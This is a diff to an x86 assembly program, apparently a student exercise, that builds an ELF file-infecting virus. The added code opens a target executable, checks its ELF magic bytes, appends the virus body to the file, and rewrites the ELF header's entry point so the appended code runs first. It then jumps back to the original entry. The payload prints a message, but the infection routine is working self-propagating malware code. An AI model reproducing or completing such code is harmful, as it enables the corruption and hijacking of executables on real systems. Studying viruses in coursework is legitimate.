@@ -55,7 +55,7 @@
 %define FD dword [ebp-4]
 %define elf_hdr ebp-56                         ; -4 - headrSize
 %define fsize dword [ebp-60]                   ; addres before headr
-%define initalEntry dword ebp-64                  
+%define initalEntry ebp-64                  
 
 
 
@@ -68,15 +68,12 @@ _start:
     sub	esp, STK_RES                           ; Set up ebp and reserve space on the stack for local storage
 
 
-    .print_msg:                                ; else, it is an elf file, print  outStr
-    call get_my_loc                            ; ??
-    add  ecx, OutStr                           ; put the string in ecx
-    write STDOUT, ecx, 32                      ; print the string to STDOUT
+
 
     .read_file:                                ; symbol name
-    call get_my_loc_b                          ; ??
+    call get_my_loc_b                          ; get relative string address
     add ebx, FileName                          ; push filename to ebx
-    open ebx,RDWR, 0x777                       ; open in read/write mode
+    open ebx, RDWR, 0x777                       ; open in read/write mode
     mov FD, eax                                ; save fs of opend file
     cmp FD, -1                                 ; if couldnt open file
     je err                                     ; display error msg and exit
@@ -86,25 +83,35 @@ _start:
     read FD, ecx, ELFHDR_size                  ; read the header of ELF
 
     .is_elf:                                   ; symbol name
-    cmp dword [elf_hdr], 0x464C457F            ; it is elf if the first bytes match 7f 45 4c in little endian
-    jne err                                    ; bytes dont match, print the FailStr
+    ; cmp dword [elf_hdr], 0x464C457F
+                                             ; read into the buffer the first 4 bytes- magic number
+    cmp byte[ebp-55], 'E'					 ; check if the file is ELF
+	jne err
+	cmp byte[ebp-54], 'L'
+	jne err
+	cmp byte[ebp-53], 'F'
+	jne err                            ; it is elf if the first bytes match 7f 45 4c ( E L F )
+
                                                ; it is an elf
 
     .infect_file:
     lseek FD, 0, SEEK_END                      ; point to the end of the file
     mov fsize, eax                             ; store file size
     call get_my_loc
-    add ecx, _start                            ; point to start of this file
-    mov edx , virus_end - _start               ; script content
+    add ecx, virus_start                            ; point to start of this file
+    mov edx , virus_end-virus_start               ; script content > edx
     write FD, ecx, edx                         ; append this script to a file
 
-    .update_header:
-    mov eax, 0x8048080                         ; base addres
+    .update_entry:
+    lseek FD, 0, SEEK_SET 					;set the file pointer to the end of the file
+	mov eax, dword [elf_hdr+ENTRY]
+	mov dword [initalEntry], eax 	
+    mov eax, 0x8048000                         ; orignial address
     add eax, fsize
-    lseek FD, 0, SEEK_SET                      ; point to the end of the file
-
+    mov dword [elf_hdr+ENTRY], eax                             ; eax has the  address of th end of original code = start of virus 
     lea ecx, [elf_hdr]                         ; save offset
     write FD, ecx, ELFHDR_size                 ; write the modified header
+
 
     .set_new_return:
     lseek FD, -4, SEEK_END                       ; modifing the last 4 bytes which hold the return address
@@ -120,7 +127,13 @@ _start:
     mov eax, [ebx]
     jmp eax
 
+    exit 0
 
+virus_start:    
+    .print_msg:                                ; else, it is an elf file, print  outStr
+    call get_my_loc                            ; get relative string address
+    add  ecx, OutStr                           ; put the string in ecx
+    write STDOUT, ecx, 32                      ; print the string to STDOUT
 VirusExit:
     exit 0                                     ; Termination if all is OK and no previous code to jump to
                                                ; (also an example for use of above macros)
